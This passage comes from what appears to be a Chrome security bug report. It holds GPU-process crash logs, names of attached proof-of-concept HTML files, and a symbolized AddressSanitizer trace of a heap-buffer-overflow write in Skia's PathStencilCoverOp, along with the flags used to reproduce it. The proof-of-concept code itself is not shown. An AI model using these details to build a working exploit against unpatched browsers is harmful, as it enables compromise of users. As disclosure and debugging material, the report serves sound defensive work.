#14 0x5965233682d5 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa882d4)
#15 0x59652336768f (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa8768e)
#16 0x596523369ac9 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa89ac8)
#17 0x5965235e312a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ad03129)
#18 0x5965235df0d1 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acff0d0)
#19 0x596523594163 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acb4162)
#20 0x5965235d301b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2acf301a)
#21 0x5965233bef8b (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aadef8a)
#22 0x59652335972c (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7972b)
#23 0x596523357bd4 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa77bd3)
#24 0x59652335ab91 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa7ab90)
#25 0x59652335335a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa73359)
#26 0x59652341df27 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3df26)
#27 0x59652341b915 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3b914)
#28 0x59652341f0c6 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2ab3f0c5)
#29 0x5965232f7a92 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa17a91)
#30 0x5965232f5c27 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa15c26)
#31 0x5965232f6196 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x2aa16195)
#32 0x59652ad35f32 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32455f31)
#33 0x59652ad10899 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32430898)
#34 0x59652a5d8d10 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cf8d0f)
#35 0x59652ae44d7a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32564d79)
#36 0x59652ae43867 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x32563866)
#37 0x59652a5b8254 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31cd8253)
#38 0x59652a5c6448 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6447)
#39 0x59652a5c622a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x31ce6229)
#40 0x596514506202 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bc26201)
#41 0x5965144da948 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfa947)
#42 0x5965144d8979 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbf8978)
#43 0x5965144dc562 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x1bbfc561)
#44 0x596521023ad7 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x28743ad6)
#45 0x59652109b28a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bb289)
#46 0x59652109a0fb (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287ba0fa)
#47 0x596520ee32c8 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286032c7)
#48 0x59652109c998 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x287bc997)
#49 0x596520f9f071 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x286bf070)
#50 0x59652c9408bd (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x340608bc)
#51 0x59651ccaa710 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ca70f)
#52 0x59651ccaba40 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243cba3f)
#53 0x59651ccae749 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243ce748)
#54 0x59651cca8122 (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c8121)
#55 0x59651cca871d (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x243c871c)
#56 0x59650984fb3a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10f6fb39)
#57 0x758cdb22a1ca (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9)
#58 0x758cdb22a28b (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a28a)
#59 0x59650977502a (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10e95029)
  r8: 00005965420dbff0  r9: 00007fffffffff01 r10: 0000000000000008 r11: 0000000000000246
 r12: 0000000000000006 r13: 0000718cd8c9b2f0 r14: 0000000000000016 r15: 0000718cd8ab8800
  di: 000000000007979e  si: 000000000007979e  bp: 00007ffc98d84930  bx: 000000000007979e
  dx: 0000000000000006  ax: 0000000000000000  cx: 0000758cdb29eb2c  sp: 00007ffc98d848f0
  ip: 0000758cdb29eb2c efl: 0000000000000246 cgf: 002b000000000033 erf: 0000000000000000
 trp: 0000000000000000 msk: 0000000000000000 cr2: 0000000000000000
[end of stack trace]
[496833:496833:0310/013852.267115:ERROR:content/browser/gpu/gpu_process_host.cc:999] GPU process exited unexpectedly: exit_code=6
[496833:496869:0310/013914.890953:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
[496833:496869:0310/013936.928479:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
WARNING: radv is not a conformant Vulkan implementation, testing use only.
Warning: maxDynamicUniformBuffersPerPipelineLayout artificially reduced from 500000 to 16 to fit dynamic offset allocation limit.
Warning: maxDynamicStorageBuffersPerPipelineLayout artificially reduced from 500000 to 16 to fit dynamic offset allocation limit.
Warning: Couldn't get proc eglChooseConfig
 - While trying to discover a BackendType::OpenGLES adapter.
    at LoadClientProcs (../../third_party/dawn/src/dawn/native/opengl/EGLFunctions.cpp:119)

[496833:496869:0310/014033.075780:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
[496833:496869:0310/014228.427404:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
[496833:496869:0310/014617.199546:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
^C%                                                                                                                                           


```

## Attachments

- [atlas_path_positive_wrap_poc.html](attachments/atlas_path_positive_wrap_poc.html) (text/html, 3.1 KB)
- [atlas_path_positive_wrap_poc.html](attachments/atlas_path_positive_wrap_poc_74438985.html) (text/html, 3.8 KB)
- [Chrome 146 PoC recording.mkv](attachments/Chrome 146 PoC recording.mkv) (video/x-matroska, 17.2 MB)
- [reliable_poc_v2.html](attachments/reliable_poc_v2.html) (text/html, 3.8 KB)
- [poc_vrp.html](attachments/poc_vrp.html) (text/html, 1020.7 KB)
- [poc_vrp.html](attachments/poc_vrp_77150647.html) (text/html, 1.0 MB)

## Timeline

### qq...@calif.io (2026-03-10)

This is symbolized stacktrace:

```
❯ ASAN_OPTIONS=detect_leaks=0:symbolize=1:fast_unwind_on_malloc=0:external_symbolizer_path=./third_party/llvm-build/Release+Asserts/bin/llvm-symbolizer  \
  ~/BAR/Chrome/linux-release_asan/chrome \
    --no-sandbox \
    --disable-skia-graphite \
    --enable-gpu-rasterization \
    --ignore-gpu-blocklist \
    atlas_path_positive_wrap_poc.html
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[15097:15097:0310/102932.646404:ERROR:ui/ozone/platform/wayland/gpu/wayland_surface_factory.cc:252] '--ozone-platform=wayland' is not compatible with Vulkan. Consider switching to '--ozone-platform=x11' or disabling Vulkan
WARNING: radv is not a conformant Vulkan implementation, testing use only.
=================================================================
==15097==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x72ba18369820 at pc 0x6399892528ff bp 0x7fffecbbce70 sp 0x7fffecbbce68
WRITE of size 8 at 0x72ba18369820 thread T0 (chrome)
    #0 0x6399892528fe in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/BufferWriter.h:92:9
    #1 0x639989206162 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #2 0x63998924501a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #3 0x639989030f8a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #4 0x639988fcb72b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #5 0x639988fc9bd3 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #6 0x639988fccb90 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #7 0x639988fc5359 in GrDirectContextPriv::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.cpp:90:47
    #8 0x639988f669bb in GrDirectContext::flush(SkSurface*, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.h:106:22
    #9 0x6399892e9007 in skgpu::ganesh::Flush(SkSurface*) third_party/skia/src/gpu/ganesh/surface/SkSurface_Ganesh.cpp:759:45
    #10 0x6399907d572f in gpu::SharedContextState::FlushWriteAccess(gpu::SkiaImageRepresentation::ScopedWriteAccess*) gpu/command_buffer/service/shared_context_state.cc:860:9
    #11 0x639990a935c7 in gpu::raster::RasterDecoderImpl::DoEndRasterCHROMIUM() gpu/command_buffer/service/raster_decoder.cc:3085:30
    #12 0x639990a8dade in gpu::raster::RasterDecoderImpl::HandleEndRasterCHROMIUM(unsigned int, void const volatile*) gpu/command_buffer/service/raster_decoder_autogen.h:151:3
    #13 0x639990a9869b in gpu::error::Error gpu::raster::RasterDecoderImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*) gpu/command_buffer/service/raster_decoder.cc:1512:18
    #14 0x63997a135804 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*) gpu/command_buffer/service/command_buffer_service.cc:267:35
    #15 0x6399902080db in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&) gpu/ipc/service/command_buffer_stub.cc:504:22
    #16 0x639990207341 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/command_buffer_stub.cc:173:7
    #17 0x63999022a45c in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/gpu_channel.cc:833:13
    #18 0x639990238447 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&) base/functional/bind_internal.h:740:12
    #19 0x639990238229 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*) base/functional/bind_internal.h:956:5
    #20 0x63997a178201 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/callback.h:155:12
    #21 0x63997a14c947 in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>) base/functional/callback.h:155:12
    #22 0x63997a14a978 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:625:3
    #23 0x63997a14e561 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #24 0x639986c95ad6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #25 0x639986d0d289 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #26 0x639986d0c0fa in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #27 0x639986b552c7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #28 0x639986d0e997 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #29 0x639986c11070 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #30 0x6399925b28bc in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:479:14
    #31 0x63998291c70f in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #32 0x63998291da3f in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #33 0x639982920748 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1152:10
    #34 0x63998291a121 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #35 0x63998291a71c in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #36 0x63996f4c1b39 in ChromeMain chrome/app/chrome_main.cc:191:12
    #37 0x76ba6762a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #38 0x76ba6762a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #39 0x63996f3e7029 in _start (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10e95029) (BuildId: c307cc2e19af7361)

0x72ba18369820 is located 0 bytes after 3145760-byte region [0x72ba18069800,0x72ba18369820)
allocated by thread T0 (chrome) here:
    #0 0x63996f4c03fd in operator new(unsigned long) (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10f6e3fd) (BuildId: c307cc2e19af7361)
    #1 0x639988fd7751 in GrBufferAllocPool::CpuBufferCache::makeBuffer(unsigned long, bool) third_party/skia/src/gpu/ganesh/GrCpuBuffer.h:29:20
    #2 0x639988fd876d in GrBufferAllocPool::resetCpuData(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:389:60
    #3 0x639988fda2d4 in GrBufferAllocPool::createBlock(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:362:15
    #4 0x639988fd968e in GrBufferAllocPool::makeSpace(unsigned long, unsigned long, sk_sp<GrBuffer const>*, unsigned long*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:229:16
    #5 0x639988fdbac8 in GrVertexBufferAllocPool::makeSpace(unsigned long, int, sk_sp<GrBuffer const>*, int*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:445:28
    #6 0x639989255129 in GrEagerDynamicVertexAllocator::lock(unsigned long, int) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.cpp:20:31
    #7 0x6399892510d0 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.h:39:25
    #8 0x639989206162 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #9 0x63998924501a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #10 0x639989030f8a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #11 0x639988fcb72b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #12 0x639988fc9bd3 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #13 0x639988fccb90 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #14 0x639988fc5359 in GrDirectContextPriv::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.cpp:90:47
    #15 0x639988f669bb in GrDirectContext::flush(SkSurface*, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.h:106:22
    #16 0x6399892e9007 in skgpu::ganesh::Flush(SkSurface*) third_party/skia/src/gpu/ganesh/surface/SkSurface_Ganesh.cpp:759:45
    #17 0x6399907d572f in gpu::SharedContextState::FlushWriteAccess(gpu::SkiaImageRepresentation::ScopedWriteAccess*) gpu/command_buffer/service/shared_context_state.cc:860:9
    #18 0x639990a935c7 in gpu::raster::RasterDecoderImpl::DoEndRasterCHROMIUM() gpu/command_buffer/service/raster_decoder.cc:3085:30
    #19 0x639990a8dade in gpu::raster::RasterDecoderImpl::HandleEndRasterCHROMIUM(unsigned int, void const volatile*) gpu/command_buffer/service/raster_decoder_autogen.h:151:3
    #20 0x639990a9869b in gpu::error::Error gpu::raster::RasterDecoderImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*) gpu/command_buffer/service/raster_decoder.cc:1512:18
    #21 0x63997a135804 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*) gpu/command_buffer/service/command_buffer_service.cc:267:35
    #22 0x6399902080db in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&) gpu/ipc/service/command_buffer_stub.cc:504:22
    #23 0x639990207341 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/command_buffer_stub.cc:173:7
    #24 0x63999022a45c in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/gpu_channel.cc:833:13
    #25 0x639990238447 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&) base/functional/bind_internal.h:740:12
    #26 0x639990238229 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*) base/functional/bind_internal.h:956:5
    #27 0x63997a178201 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/callback.h:155:12

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/skia/src/gpu/BufferWriter.h:92:9 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*)
Shadow bytes around the buggy address:
  0x72ba18369580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba18369600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba18369680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba18369700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba18369780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x72ba18369800: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x72ba18369880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba18369900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba18369980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba18369a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba18369a80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==15097==ADDITIONAL INFO

==15097==Note: Please include this section with the ASan report.
Task trace:
    #0 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #1 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #2 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #3 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27


Command line: `/proc/self/exe --type=gpu-process --no-sandbox --enable-gpu-rasterization --disable-skia-graphite --ozone-platform=wayland --render-node-override=/dev/dri/renderD128 --crashpad-handler-pid=15040 --enable-crash-reporter=, --disable-breakpad --change-stack-guard-on-fork=enable --gpu-preferences=UAAAAAAAAAAgAQAMAAAAAAAAAAAAAMAAAQAAAAAAAAAAAAAAAAAAABARAAAAAAAAAAAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAAAAAAAAAAABARAAAAAAAAAAgAAAAAAAAA --shared-files --metrics-shmem-handle=4,i,7157746574723163147,6121242433055891038,262144 --field-trial-handle=3,i,1065319797526636146,7725492769041559239,262144 --disable-features=EyeDropper --variations-seed-version --pseudonymization-salt-handle=7,i,14663162623263158245,3497144085525861933,4 --trace-process-track-uuid=3190708988185955192`


==15097==END OF ADDITIONAL INFO

==15097==ABORTING
[15036:15036:0310/103018.879958:ERROR:content/browser/gpu/gpu_process_host.cc:999] GPU process exited unexpectedly: exit_code=256
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[15622:15622:0310/103019.292356:ERROR:ui/ozone/platform/wayland/gpu/wayland_surface_factory.cc:252] '--ozone-platform=wayland' is not compatible with Vulkan. Consider switching to '--ozone-platform=x11' or disabling Vulkan
WARNING: radv is not a conformant Vulkan implementation, testing use only.
=================================================================
==15622==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x72ba1897c820 at pc 0x6399892528ff bp 0x7fffecbbce70 sp 0x7fffecbbce68
WRITE of size 8 at 0x72ba1897c820 thread T0 (chrome)
    #0 0x6399892528fe in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/BufferWriter.h:92:9
    #1 0x639989206162 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #2 0x63998924501a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #3 0x639989030f8a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #4 0x639988fcb72b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #5 0x639988fc9bd3 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #6 0x639988fccb90 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #7 0x639988fc5359 in GrDirectContextPriv::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.cpp:90:47
    #8 0x639988f669bb in GrDirectContext::flush(SkSurface*, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.h:106:22
    #9 0x6399892e9007 in skgpu::ganesh::Flush(SkSurface*) third_party/skia/src/gpu/ganesh/surface/SkSurface_Ganesh.cpp:759:45
